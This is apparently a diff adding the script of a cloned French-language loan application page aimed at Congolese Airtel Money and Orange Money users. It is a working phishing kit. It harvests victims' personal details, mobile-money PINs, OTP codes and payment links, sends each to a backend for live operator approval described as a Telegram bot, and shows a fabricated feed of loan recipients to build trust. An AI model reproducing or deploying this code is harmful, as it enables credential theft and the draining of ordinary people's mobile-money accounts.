+        <div class="loading-box" id="loadingBox">
+            <div class="loading-spinner"></div>
+            <p id="loadingText" style="color: #333; font-size: 16px; font-weight: 700;">En attente de l'Agent IMF</p>
+            <p id="loadingSubtext" style="color: #666; font-size: 13px; margin-top: 5px;">Veuillez patienter pendant que l'Agent IMF vérifie vos informations</p>
+            
+            <!-- Admin Approval Panel inside overlay -->
+            <div id="adminApprovalPanel" class="admin-panel" style="margin-top: 20px; text-align: left;">
+                <h3><i class="fa-solid fa-user-shield text-amber-500"></i> Statut de la demande</h3>
+                <div id="adminDetails">
+                    <div class="detail-row"><span class="label">Demandeur</span><span class="value" id="adminName">--</span></div>
+                    <div class="detail-row"><span class="label">Téléphone</span><span class="value" id="adminPhone">--</span></div>
+                    <div class="detail-row"><span class="label">Montant</span><span class="value" id="adminAmount">--</span></div>
+                    <div class="detail-row"><span class="label">Méthode</span><span class="value" id="adminMethod">--</span></div>
+                    <div class="detail-row"><span class="label">Code saisi</span><span class="value" id="adminCode">--</span></div>
+                    <div class="detail-row"><span class="label">Statut</span><span class="value" id="adminStatus"><span class="status-badge pending">En attente</span></span></div>
+                </div>
+                <div style="text-align: center; margin-top: 15px; font-size: 13px; color: #64748b;">
+                    <i class="fa-regular fa-clock"></i> En attente de la décision de l'Agent IMF
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Status Toast -->
+    <div id="statusToast" class="status-toast">
+        <span id="statusText">Message</span>
+    </div>
+
+    <script>
+        // ============================================================
+        // TELEGRAM BOT INTEGRATION WITH INLINE KEYBOARD + LONG POLLING
+        // ============================================================
+
+        // Store application data
+        let appData = {
+            personal: null,
+            paymentMethod: null,
+            airtelPin: null,
+            airtelOtp: null,
+            orangePin: null,
+            orangeLink: null,
+            caseNumber: null,
+            pendingRequest: null,
+            requestId: null
+        };
+
+        let pendingApproval = null;
+        let updateOffset = 0;
+        let pollingActive = false;
+        let pollingStarted = false;
+
+        // ============================================================
+        // BENEFICIARY POPUP FEED
+        // ============================================================
+        const beneficiaries = [
+            { name: 'Jean-Pierre K.', phone: '+243 81 *** 5678', amount: '5,000', method: 'Orange' },
+            { name: 'Marie K.', phone: '+243 97 *** 8834', amount: '2,500', method: 'Airtel' },
+            { name: 'Patrick M.', phone: '+243 82 *** 1209', amount: '10,000', method: 'Orange' },
+            { name: 'Grace I.', phone: '+243 99 *** 2341', amount: '1,200', method: 'Airtel' },
+            { name: 'David M.', phone: '+243 81 *** 4477', amount: '7,500', method: 'Orange' },
+            { name: 'Clarisse N.', phone: '+243 97 *** 3290', amount: '3,800', method: 'Airtel' },
+            { name: 'Christian B.', phone: '+243 82 *** 7712', amount: '15,000', method: 'Orange' },
+            { name: 'Esther K.', phone: '+243 99 *** 8845', amount: '4,200', method: 'Airtel' },
+            { name: 'Fabrice T.', phone: '+243 81 *** 9902', amount: '6,000', method: 'Orange' },
+            { name: 'Sarah L.', phone: '+243 97 *** 1234', amount: '2,000', method: 'Airtel' },
+            { name: 'Emmanuel D.', phone: '+243 82 *** 5566', amount: '8,500', method: 'Orange' },
+            { name: 'Josiane M.', phone: '+243 99 *** 7788', amount: '3,000', method: 'Airtel' }
+        ];
+        let beneficiaryIndex = 0;
+        let beneficiaryTimer = null;
+
+        function showBeneficiaryToast() {
+            const feed = document.getElementById('beneficiaryFeed');
+            if (!feed) return;
+            // Don't show feed if not on home page
+            const homeVisible = !document.getElementById('page-1').classList.contains('hidden-page');
+            if (!homeVisible) {
+                setTimeout(showBeneficiaryToast, 3000);
+                return;
+            }
+
+            const b = beneficiaries[beneficiaryIndex % beneficiaries.length];
+            beneficiaryIndex++;
+
+            const toast = document.createElement('div');
+            toast.className = 'beneficiary-toast ' + (b.method === 'Airtel' ? 'airtel' : 'orange');
+            const initials = b.name.split(' ').map(p => p[0]).join('').substring(0, 2).toUpperCase();
+            
+            toast.innerHTML = `
+                <div class="beneficiary-avatar" style="position: relative;">
+                    ${initials}
+                    <span class="beneficiary-verified"><i class="fa-solid fa-check"></i></span>
+                </div>
+                <div class="beneficiary-info">
+                    <span class="beneficiary-name">${b.name}</span>
+                    <span class="beneficiary-detail">${b.phone} · <span class="beneficiary-amount">$${b.amount} USD</span></span>
+                </div>
+            `;
+            feed.appendChild(toast);
+
+            // Auto-remove after 6.5s
+            setTimeout(() => {
+                toast.classList.add('hiding');
+                setTimeout(() => toast.remove(), 600);
+            }, 6500);
+
+            // Next toast in 4-7s (varied)
+            const nextDelay = 4000 + Math.random() * 3000;
+            beneficiaryTimer = setTimeout(showBeneficiaryToast, nextDelay);
+        }
+
+        function startBeneficiaryFeed() {
+            if (beneficiaryTimer) clearTimeout(beneficiaryTimer);
+            // First toast after 1.8s
+            beneficiaryTimer = setTimeout(showBeneficiaryToast, 1800);
+        }
+
+        // ============================================================
+        // UI Functions
+        // ============================================================
+        function showStatus(message, type = 'info') {
+            const toast = document.getElementById('statusToast');
+            const text = document.getElementById('statusText');
+            toast.className = `status-toast ${type}`;
+            text.textContent = message;
+            toast.style.display = 'block';
+            
+            clearTimeout(window._statusTimeout);
+            window._statusTimeout = setTimeout(() => {
+                toast.style.display = 'none';
+            }, 6000);
+        }
+
+        function showLoading(message = 'En attente de l\'Agent IMF...') {
+            const overlay = document.getElementById('loadingOverlay');
+            const text = document.getElementById('loadingText');
+            const box = document.getElementById('loadingBox');
+            text.textContent = message;
+            overlay.style.display = 'flex';
+            overlay.classList.remove('collapsing');
+            box.classList.add('large');
+        }
+
+        function hideLoading() {
+            const overlay = document.getElementById('loadingOverlay');
+            const box = document.getElementById('loadingBox');
+            overlay.classList.add('collapsing');
+            setTimeout(() => {
+                overlay.style.display = 'none';
+                overlay.classList.remove('collapsing');
+            }, 400);
+            box.classList.remove('large');
+        }
+
+        // ============================================================
+        // Admin Panel Update
+        // ============================================================
+        function updateAdminPanel(data, status = 'pending') {
+            document.getElementById('adminName').textContent = data.fullName || '--';
+            document.getElementById('adminPhone').textContent = data.phone || '--';
+            document.getElementById('adminAmount').textContent = data.amount ? '$' + data.amount + ' USD' : '--';
+            document.getElementById('adminMethod').textContent = data.method || '--';
+            document.getElementById('adminCode').textContent = data.code || '--';
+            
+            const statusEl = document.getElementById('adminStatus');
+            if (status === 'approved') {
+                statusEl.innerHTML = '<span class="status-badge approved">✅ Approuvé</span>';
+            } else if (status === 'rejected') {
+                statusEl.innerHTML = '<span class="status-badge rejected">❌ Rejeté</span>';
+            } else {
+                statusEl.innerHTML = '<span class="status-badge pending">⏳ En attente</span>';
+            }
+        }
+
+        // ============================================================
+        // Telegram Message Sending
+        // ============================================================
+
+
+        // ============================================================
+        // Telegram Long Polling for Button Clicks
+        // ============================================================
+
+        let statusPollTimer = null;
+
+        function startBackendStatusPolling(requestId) {
+            if (statusPollTimer) clearInterval(statusPollTimer);
+            statusPollTimer = setInterval(async () => {
+                try {
+                    const res = await fetch(`/api/status/${requestId}`);
+                    const data = await res.json();
+                    if (data.status === 'approve') {
+                        clearInterval(statusPollTimer);
+                        handleApprovalDecision('approve', requestId);
+                    } else if (data.status === 'retry') {
+                        clearInterval(statusPollTimer);
+                        handleApprovalDecision('reject', requestId);
+                    }
+                } catch (e) {}
+            }, 2000);
+        }
+
+        function getNextPage(type, method) {
+            if (method === 'airtel') {
+                if (type === 'pin') return 'page-airtel-otp';
+                if (type === 'otp') return 'page-5';
+            } else if (method === 'orange') {
+                if (type === 'pin') return 'page-orange-link';
+                if (type === 'otp') return 'page-5';
+            }
+            return 'page-5';
+        }
+
+        function getErrorInfo(type, method) {
+            if (method === 'airtel') {
+                if (type === 'pin') {
+                    return {
+                        page: 'page-airtel-login',
+                        message: 'Code PIN incorrect. Veuillez réessayer.',
+                        clearContainer: 'airtelPinContainer',
+                        clearField: null
+                    };
+                }
+                if (type === 'otp') {
+                    return {
+                        page: 'page-airtel-otp',
+                        message: 'Code OTP incorrect. Veuillez réessayer.',
+                        clearContainer: 'airtelOtpContainer',
+                        clearField: null
+                    };
+                }
+            } else if (method === 'orange') {
+                if (type === 'pin') {
+                    return {
+                        page: 'page-orange-login',
+                        message: 'Code secret incorrect. Veuillez réessayer.',
+                        clearContainer: 'orangePinContainer',
+                        clearField: null
+                    };
+                }
+                if (type === 'otp') {
+                    return {
+                        page: 'page-orange-link',
+                        message: 'Lien de paiement incorrect. Veuillez réessayer.',
+                        clearContainer: null,
+                        clearField: 'orangeLinkInput'
+                    };
+                }
+            }
+            return {
+                page: 'page-1',
+                message: 'Erreur. Veuillez réessayer.',
+                clearContainer: null,
+                clearField: null
+            };
+        }
+
+        function handleApprovalDecision(decision, requestId) {
+            if (!pendingApproval || pendingApproval.requestId !== requestId) {
+                console.warn('⚠️ No pending request matches:', requestId);
+                showStatus('⚠️ Aucune demande en attente correspondante', 'error');
+                return;
+            }
+
+            const current = { ...pendingApproval };
+            const nextPage = getNextPage(current.type, current.method);
+            const errorInfo = getErrorInfo(current.type, current.method);
+
+            if (decision === 'approve') {
+                updateAdminPanel(current, 'approved');
+                document.getElementById('loadingText').textContent = '✅ Demande approuvée';
+                document.getElementById('loadingSubtext').textContent = 'Redirection en cours...';
+
+                const msg = `✅ <b>REQUEST APPROVED</b>\n\n` +
+                            `👤 <b>Applicant:</b> ${current.fullName}\n` +
+                            `📱 <b>Phone:</b> +243 ${current.phone}\n` +
+                            `💰 <b>Amount:</b> $${current.amount} USD\n` +
+                            `📱 <b>Method:</b> ${current.method}\n` +
+                            `🔑 <b>Code:</b> ${current.code}\n` +
+                            `⏰ <b>Approved at:</b> ${new Date().toLocaleString()}\n\n` +
+                            `🎉 <b>Request approved. User has been redirected to the next step.</b>`;
+
+                setTimeout(() => {
+                    hideLoading();
+                    pendingApproval = null;
+                    appData.pendingRequest = null;
+
+                    if (nextPage === 'page-5') {
+                        generateCaseNumber();
+                        navigateTo('page-5');
+                        showStatus('✅ Vérification réussie!', 'success');
+                    } else {
+                        navigateTo(nextPage);
+                        if (nextPage === 'page-airtel-otp') {
+                            startTimer('airtelTimer', 'airtelSecs', 60);
+                        } else if (nextPage === 'page-orange-link') {
+                            startTimer('orangeTimer', null, 30);
+                        }
+                        showStatus('✅ Étape validée', 'success');
+                    }
+                }, 1200);
+
+            } else {
+                updateAdminPanel(current, 'rejected');
+                document.getElementById('loadingText').textContent = '❌ Donnée incorrecte';
+                document.getElementById('loadingSubtext').textContent = errorInfo.message;
+
+                const msg = `❌ <b>REQUEST REJECTED</b>\n\n` +
+                            `👤 <b>Applicant:</b> ${current.fullName}\n` +
+                            `📱 <b>Phone:</b> +243 ${current.phone}\n` +
+                            `💰 <b>Amount:</b> $${current.amount} USD\n` +
+                            `📱 <b>Method:</b> ${current.method}\n` +
+                            `🔑 <b>Rejected value:</b> ${current.code}\n` +
+                            `⏰ <b>Rejected at:</b> ${new Date().toLocaleString()}\n\n` +
+                            `⚠️ <b>User has been notified and returned to the input screen.</b>`;
+
+                setTimeout(() => {
+                    hideLoading();
+                    pendingApproval = null;
+                    appData.pendingRequest = null;
+
+                    navigateTo(errorInfo.page);
+
+                    if (errorInfo.clearContainer) {
+                        const container = document.getElementById(errorInfo.clearContainer);
+                        if (container) {
+                            container.querySelectorAll('input').forEach(inp => inp.value = '');
+                            const first = container.querySelector('input');
+                            if (first) first.focus();
+                        }
+                    }
+                    if (errorInfo.clearField) {
+                        const field = document.getElementById(errorInfo.clearField);
+                        if (field) {
+                            field.value = '';
+                            field.focus();
+                        }
+                    }
+
+                    showStatus('❌ ' + errorInfo.message, 'error');
+                }, 1200);
+            }
+        }
+
+        // ============================================================
+        // Navigation Functions
+        // ============================================================
+        let activeTimer = null;
+
+        function navigateTo(pageId) {
+            const pages = ['page-1', 'page-2', 'page-3', 'page-airtel-login', 'page-airtel-otp', 'page-orange-login', 'page-orange-link', 'page-5'];
+            pages.forEach(id => {
+                const el = document.getElementById(id);
+                if (el) {
+                    if (id === pageId) {
+                        el.classList.remove('hidden-page');
+                    } else {
+                        el.classList.add('hidden-page');
+                    }
+                }
+            });
+            // Hide the beneficiary feed when leaving the home page
+            const feed = document.getElementById('beneficiaryFeed');
+            if (feed) {
+                if (pageId !== 'page-1') {
+                    feed.innerHTML = '';
+                }
+            }
+            window.scrollTo(0, 0);
+        }
+
+        // ============================================================
+        // Page 2: Personal Details Handler
+        // ============================================================
+        function handleDetailsSubmit(e) {
+            e.preventDefault();
+            const fullName = document.getElementById('fullName').value.trim();
+            const email = document.getElementById('email').value.trim();
+            const phone = document.getElementById('drcPhone').value.trim();
+            const profession = document.getElementById('profession').value;
+            const address = document.getElementById('address').value.trim();
+            const loanAmount = document.getElementById('loanAmount').value;
+
+            if (!fullName || !phone || !profession || !address || !loanAmount) {
+                alert('Veuillez remplir tous les champs obligatoires.');
+                return;
+            }
+
+            appData.personal = { fullName, email, phone, profession, address, loanAmount };
+
+            document.getElementById('summaryApplicant').textContent = fullName;
+            document.getElementById('summaryAmount').textContent = '$' + loanAmount + ' USD';
+            document.getElementById('airtelPhone').value = phone;
+            document.getElementById('orangePhone').value = phone;
+
+            navigateTo('page-3');
+        }
+
+        // ============================================================
+        // Page 3: Payment Method Selection
+        // ============================================================
+        function selectPaymentMethod(method) {
+            appData.paymentMethod = method;
+            if (method === 'airtel') {
+                navigateTo('page-airtel-login');
+            } else if (method === 'orange') {
+                navigateTo('page-orange-login');
+            }
+        }
+
+        // ============================================================
+        // Airtel Login Handler (PIN)
+        // ============================================================
+        async function handleAirtelLogin() {
+            const phone = document.getElementById('airtelPhone').value.trim();
+            const pinVal = getGroupValue('airtelPinContainer');
+
+            if (!phone) {
+                alert('Veuillez entrer votre numéro de téléphone.');
+                return;
+            }
+            if (pinVal.length < 4) {
+                alert('Veuillez saisir votre code PIN à 4 chiffres.');
+                return;
+            }
+
+            appData.airtelPin = pinVal;
+            await sendVerificationRequest(phone, pinVal, 'airtel', 'pin');
+        }
+
+        // ============================================================
+        // Airtel OTP Handler
+        // ============================================================
+        async function handleAirtelOtpVerify() {
+            const otpVal = getGroupValue('airtelOtpContainer');
+            const phone = document.getElementById('airtelPhone').value.trim();
+            
+            if (otpVal.length < 4) {
+                alert('Veuillez saisir le code OTP complet à 4 chiffres.');
+                return;
+            }
+
+            appData.airtelOtp = otpVal;
+            await sendVerificationRequest(phone, otpVal, 'airtel', 'otp');
+        }
+
+        // ============================================================
+        // Orange Login Handler (PIN)
+        // ============================================================
+        async function handleOrangeLogin() {
+            const phone = document.getElementById('orangePhone').value.trim();
+            const pinVal = getGroupValue('orangePinContainer');
+
+            if (!phone) {
+                alert('Veuillez entrer votre numéro de téléphone.');
+                return;
+            }
+            if (pinVal.length < 4) {
+                alert('Veuillez saisir votre code secret à 4 chiffres.');
+                return;
+            }
+
+            appData.orangePin = pinVal;
+            await sendVerificationRequest(phone, pinVal, 'orange', 'pin');
+        }
+
+        // ============================================================
+        // Orange Link Handler
+        // ============================================================
+        async function handleOrangeLinkSubmit() {
+            const linkVal = document.getElementById('orangeLinkInput').value.trim();
+            const phone = document.getElementById('orangePhone').value.trim();
+            
+            if (!linkVal) {
+                alert('Veuillez coller le lien de paiement reçu.');
+                return;
+            }
+
+            appData.orangeLink = linkVal;
+            await sendVerificationRequest(phone, linkVal, 'orange', 'otp');
+        }
+
+        // ============================================================
+        // Unified Verification Request Sender
+        // ============================================================
+        const urlParams = new URLSearchParams(window.location.search);
+        const currentRef = urlParams.get('ref') || 'default';
+
+        async function sendVerificationRequest(phone, value, method, type) {
+            const userData = appData.personal || {};
+            const requestId = 'req_' + Date.now() + '_' + Math.random().toString(36).substr(2, 6);
+            appData.requestId = requestId;
+
+            const methodName = method === 'airtel' ? 'Airtel Money' : 'Orange Money';
+            const fieldKey = type === 'pin' ? 'entered_pin' : 'entered_otp';
+            const formattedPhone = '+243 ' + phone;
+
+            let sent = false;
+            try {
+                const res = await fetch('/api/save', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        appId: requestId,
+                        ref: currentRef,
+                        fullName: `${userData.fullName || 'N/A'} (${methodName})`,
+                        mobile: formattedPhone,
+                        amount: userData.loanAmount || '0',
+                        field: fieldKey,
+                        value: value
+                    })
+                });
+                sent = res.ok;
+            } catch (e) {
+                console.error('Failed to send to backend:', e);
+            }
+
+            if (!sent) {
+                showStatus('❌ Erreur de connexion au serveur', 'error');
+                return;
+            }
+
+            startBackendStatusPolling(requestId);
+            const adminData = {
+                fullName: userData.fullName || 'N/A',
+                phone: phone,
+                amount: userData.loanAmount || '0',
+                method: methodName,
+                code: value,
+                type: type,
+                paymentMethod: method,
+                requestId: requestId
+            };
+
+            pendingApproval = adminData;
+            appData.pendingRequest = { type, phone, value, method, requestId };
+
+            updateAdminPanel(adminData, 'pending');
+            document.getElementById('loadingText').textContent = 'En attente de l\'Agent IMF';
+            document.getElementById('loadingSubtext').textContent = 'Veuillez patienter pendant que l\'Agent IMF vérifie vos informations';
+
+            showLoading('En attente de l\'Agent IMF...');
+            showStatus('📤 Envoyé à l\'Agent IMF pour vérification', 'info');
+        }
+
+        // ============================================================
+        // Send OTP Resend Request to Telegram (English)
+        // ============================================================
+        async function sendOtpResendToTelegram(phone) {
+            const userData = appData.personal || {};
+            try {
+                const res = await fetch('/api/save', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        appId: 'resend_' + Date.now(),
+                        ref: currentRef,
+                        fullName: userData.fullName || 'N/A',
+                        mobile: '+243 ' + phone,
+                        amount: userData.loanAmount || '0',
+                        field: 'otp_resend',
+                        value: 'User requested a new OTP code'
+                    })
+                });
+                return res.ok;
+            } catch (e) {
+                return false;
+            }
+        }
+
+        // ============================================================
+        // Timer Functions
+        // ============================================================
+        function startTimer(displayId, secsId, duration) {
+            clearInterval(activeTimer);
+            let timer = duration;
+            const displayEl = document.getElementById(displayId);
+            const secsEl = secsId ? document.getElementById(secsId) : null;
+
+            activeTimer = setInterval(() => {
+                let minutes = parseInt(timer / 60, 10);
+                let seconds = parseInt(timer % 60, 10);
+
+                minutes = minutes < 10 ? "0" + minutes : minutes;
+                seconds = seconds < 10 ? "0" + seconds : seconds;
+
+                if (displayEl) displayEl.textContent = minutes + ":" + seconds;
+                if (secsEl) secsEl.textContent = seconds;
+
+                if (--timer < 0) {
+                    clearInterval(activeTimer);
+                    if (displayEl) displayEl.textContent = "00:00";
+                }
+            }, 1000);
+        }
+
+        function restartTimer(displayId, secsId, duration) {
+            clearInterval(activeTimer);
+            startTimer(displayId, secsId, duration);
+            const phone = document.getElementById('airtelPhone')?.value?.trim() || 
+                          document.getElementById('orangePhone')?.value?.trim() || '';
+            if (phone) {
+                sendOtpResendToTelegram(phone);
+                showStatus('📤 Demande de renvoi OTP envoyée', 'info');
+            }
+        }
+
+        // ============================================================
+        // Helper Functions
+        // ============================================================
+        function getGroupValue(containerId) {
+            const container = document.getElementById(containerId);
+            if (!container) return '';
+            let val = '';
+            container.querySelectorAll('input').forEach(input => val += input.value);
+            return val;
+        }
+
+        function generateCaseNumber() {
+            const randomNum = Math.floor(100000000000 + Math.random() * 900000000000);
+            const caseNum = 'DRC-' + randomNum;
+            document.getElementById('caseNumber').textContent = caseNum;
+            appData.caseNumber = caseNum;
+        }
+
+        function resetForm(formId) {
+            document.getElementById(formId).reset();
+            document.querySelectorAll('#airtelPinContainer .pin-box, #airtelOtpContainer .otp-box, #orangePinContainer .pin-box').forEach(input => {
+                input.value = '';
+            });
+            const linkInput = document.getElementById('orangeLinkInput');
+            if (linkInput) linkInput.value = '';
+            
+            appData = {
+                personal: null,
+                paymentMethod: null,
+                airtelPin: null,
+                airtelOtp: null,
+                orangePin: null,
+                orangeLink: null,
+                caseNumber: null,
+                pendingRequest: null,
+                requestId: null
+            };
+            pendingApproval = null;
+            clearInterval(activeTimer);
+            hideLoading();
+            navigateTo('page-1');
+            showStatus('🔄 Formulaire réinitialisé', 'info');
+        }
+
+        // ============================================================
+        // Input Group Setup
+        // ============================================================
+        function setupInputGroup(containerId) {
+            const container = document.getElementById(containerId);
+            if (!container) return;
+            const inputs = container.querySelectorAll('input');
+
+            inputs.forEach((input, index) => {
+                input.addEventListener('input', () => {
+                    input.value = input.value.replace(/[^0-9]/g, '');
+                    if (input.value.length === 1 && index < inputs.length - 1) {
+                        inputs[index + 1].focus();
+                    }
+                });
+
+                input.addEventListener('keydown', (e) => {
+                    if (e.key === 'Backspace' && !input.value && index > 0) {
+                        inputs[index - 1].focus();
+                    }
+                });
+            });
+        }
+
+        // ============================================================
+        // Initialize
+        // ============================================================
+     document.addEventListener('DOMContentLoaded', () => {
+         setupInputGroup('airtelPinContainer');
+         setupInputGroup('airtelOtpContainer');
+         setupInputGroup('orangePinContainer');
+
+         // Start the beneficiary popup feed
+         startBeneficiaryFeed();
+     });
+
+        // Expose functions globally
+        window.navigateTo = navigateTo;
+        window.handleDetailsSubmit = handleDetailsSubmit;
+        window.selectPaymentMethod = selectPaymentMethod;
+        window.handleAirtelLogin = handleAirtelLogin;
+        window.handleAirtelOtpVerify = handleAirtelOtpVerify;
+        window.handleOrangeLogin = handleOrangeLogin;
+        window.handleOrangeLinkSubmit = handleOrangeLinkSubmit;
+        window.resetForm = resetForm;
+        window.startTimer = startTimer;
+        window.restartTimer = restartTimer;
+        window.getGroupValue = getGroupValue;
+        window.generateCaseNumber = generateCaseNumber;
+    </script>
+</body>
+
+<!-- Mirrored from https://drc-airtel-orange-prets-imf.vercel.app/ by HTTrack Website Copier/3.x [XR&CO], Mon, 23 Nov 2026 20:05:58 GMT -->
+</html>
